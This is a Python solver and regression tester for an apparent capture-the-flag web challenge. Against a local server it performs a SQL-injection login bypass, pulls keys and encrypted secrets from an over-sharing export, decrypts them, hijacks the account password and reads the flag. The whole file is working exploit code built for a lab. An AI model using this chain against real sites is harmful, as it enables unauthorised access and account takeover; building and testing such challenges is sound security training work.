"""
Vaultline Heist — reference solver / end-to-end tester.

Walks the whole attacker chain against a LIVE server over HTTP:

    SQLi auth-bypass login  ->  data export leak  ->  AES-256 decrypt
    ->  rotate password  ->  open vault  ->  read the flag

Usage:
    python tools/solve.py http://127.0.0.1:8000 <target_username>

It uses the SQL-injection path so it needs only the target username (no
password). Handy as a regression check that the full chain works.
"""

import base64
import json
import sys

import requests
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def aes_decrypt(blob: str, secret: str) -> str:
    """Decrypt the encode-decode.com AES-256 scheme: key = secret zero-padded to
    32 bytes, IV = zeros, CBC, PKCS#7. Returns the plain value string."""
    key = secret.encode()[:32].ljust(32, b"\x00")
    ct = base64.b64decode(blob)
    dec = Cipher(algorithms.AES(key), modes.CBC(b"\x00" * 16)).decryptor()
    padded = dec.update(ct) + dec.finalize()
    unp = padding.PKCS7(algorithms.AES.block_size).unpadder()
    return (unp.update(padded) + unp.finalize()).decode()

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000").rstrip("/")
USERNAME = sys.argv[2] if len(sys.argv) > 2 else "abraham"

s = requests.Session()
s.headers["Accept"] = "text/html"  # behave like a browser -> redirect + session


def csrf():
    return s.cookies.get("csrftoken", "")


# 1. SQL-injection auth bypass: username = victim' --  (password ignored).
r = s.post(f"{BASE}/portal/login/",
           data={"username": f"{USERNAME}' --", "password": "x"}, allow_redirects=False)
assert r.status_code == 302, f"[1] SQLi login failed: {r.status_code}"
print("[1] SQLi auth-bypass login  -> OK (session established)")

# 2. Over-sharing data export.
export = s.get(f"{BASE}/portal/profile/data/").json()
assert "vault_algorithm_key" in export and "encrypted_vault_password" in export, "[2] export missing fields"
print("[2] Data export leak        -> OK", list(export.keys()))


# 3. Decrypt the two AES-256 values (encode-decode.com scheme); id is plaintext.
password = aes_decrypt(export["encrypted_password"], export["algorithm_key"])
vault_id = export["vault_id"]
vault_password = aes_decrypt(export["encrypted_vault_password"], export["vault_algorithm_key"])
print(f"[3] AES-256 decrypt          -> OK password: {password} | vault: {vault_id} / {vault_password}")

# 4. Negative check: opening the vault before rotating must be gated (403).
s.get(f"{BASE}/portal/vault/")  # prime csrf cookie
r = s.post(f"{BASE}/portal/vault/",
           data={"vault_id": vault_id, "vault_password": vault_password},
           headers={"X-CSRFToken": csrf(), "Referer": BASE})
assert r.status_code == 403, f"[4] expected 403 before rotation, got {r.status_code}"
print("[4] Vault gated before rotate-> OK (403)")

# 5. Rotate the account password (unlocks the vault input).
s.get(f"{BASE}/portal/rotate/")
r = s.post(f"{BASE}/portal/rotate/",
           data={"new_password": "pwned1234", "confirm_password": "pwned1234"},
           headers={"X-CSRFToken": csrf(), "Referer": BASE}, allow_redirects=False)
assert r.status_code == 302, f"[5] rotate failed: {r.status_code}"
print("[5] Rotate password          -> OK")

# 6. Open the vault with the decrypted credentials (auto-closes the case).
s.get(f"{BASE}/portal/vault/")
r = s.post(f"{BASE}/portal/vault/",
           data={"vault_id": vault_id, "vault_password": vault_password},
           headers={"X-CSRFToken": csrf(), "Referer": BASE})
assert r.status_code == 200, f"[6] vault open failed: {r.status_code}"
print("[6] Open vault               -> OK (case auto-closed)")

# 7. Read the loot -> the flag.
loot = s.get(f"{BASE}/portal/vault/loot/").text
flag = next(l.split("FLAG:")[1].strip() for l in loot.splitlines() if l.startswith("FLAG:"))
print("[7] Loot flag                ->", flag)

print("\nFULL CHAIN OK. Breaching the vault auto-closed the case on the operations board.")
